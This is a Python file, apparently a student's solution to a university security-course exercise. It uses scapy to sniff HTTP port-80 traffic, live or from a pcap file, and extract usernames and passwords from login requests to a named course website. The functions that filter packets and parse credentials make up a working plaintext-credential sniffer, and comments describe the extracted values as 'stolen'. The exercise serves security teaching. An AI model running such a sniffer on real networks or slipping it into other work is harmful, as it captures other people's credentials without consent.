import scapy.all as S
import urllib.parse as urlparse
from typing import Tuple


WEBSITE = 'infosec.cs.tau.ac.il'
"""
    This function extract the substring in the text argument
    from the first instance of word_split to the second (if there is)
    and from that substring we take the substring from the first char until
    next_split argument. if next_split is empty string we return the whole substring.
    return the desired substring on success and "" on failure 
"""
def extract_login_details(text, word_split, next_split):    
    # Split the string at the desired starting point
    split_str = text.split(word_split)
    extracted_substring = ""
    
    # Check if the split was successful
    if len(split_str) > 1:
    
        if next_split != "":
            # Extract the substring after word_split and before next_split
            extracted_substring = split_str[1].split(next_split)[0]
        else:
            #Extract the substring after word_split, we want it until the end
            extracted_substring = split_str[1]
            
        return extracted_substring
        
    return ""


def parse_packet(packet) -> Tuple[str]:
    """
    If the given packet is a login request to the course website, return the
    username and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Notes:
    1. You can assume the entire HTTP request fits within one packet, and that
       both the username and password are non-empty for login requests (if any
       of the above assumptions fails, it's OK if you don't extract the
       user/password - but you must still NOT crash).
    2. Filter the course website using the `WEBSITE` constant from above. DO NOT
       use the server IP for the filtering (as our domain may point to different
       IPs later and your code should be reliable).
    3. Make sure you return a tuple, not a list.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
    #the structure of the username and password in the packet
    user = "username="
    passw = "password="
    curr_web = WEBSITE + "/2023/login"#desired url address
    try:
        #print(bytes(packet[S.TCP].payload).decode())
        #inside urlparse.path there is all the information we need
        packet_str = str(packet)
        pack_url = urlparse.urlparse(packet_str).path
        
        #check if the desired url is in the packet
        if curr_web in pack_url: 
            #steal the username and password
            stolen_user = extract_login_details(pack_url, user, '&')
            stolen_passw = extract_login_details(pack_url, passw, '')

            #if empty there wasn't username or password, return None
            if stolen_user == "" or stolen_passw == "":
                return None
            else:
                return (stolen_user, stolen_passw)
        else:
            return None
        
    except: #we don't want to crash
        return None
    return None

def packet_filter(packet) -> bool:
    """
    Filter to keep only HTTP traffic (port 80) from any HTTP client to any
    HTTP server (not just the course website). This function should return
    `True` for packets that match the above rule, and `False` for all other
    packets.

    Notes:
    1. We are only keeping HTTP, while dropping HTTPS
    2. Traffic from the server back to the client should not be kept
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
    """debug:
    print(packet)
    print(type(packet))
    print(packet[S.TCP].mysummary())
    print(type(packet[S.TCP].mysummary()))
    print(packet[S.TCP].payload)
    print(type(packet[S.TCP].payload))"""
    
    http_str = ''
    
    #the protocol should be TCP (http work over TCP) 
    if not packet.haslayer(S.TCP):
        return False
    #get the packet summary    
    http_str = packet[S.TCP].mysummary()    
    #print("http" in http_str)    
    
    #if the destination port is 80 and "http" is found in the packet 
    #summary then return true
    if packet.dport == 80 and "http" in http_str:
        return True
    return False

def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print('Usage: %s [<path/to/recording.pcapng>]' % args[0])

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print(parse_packet(packet))


if __name__ == '__main__':
    import sys
    main(sys.argv)
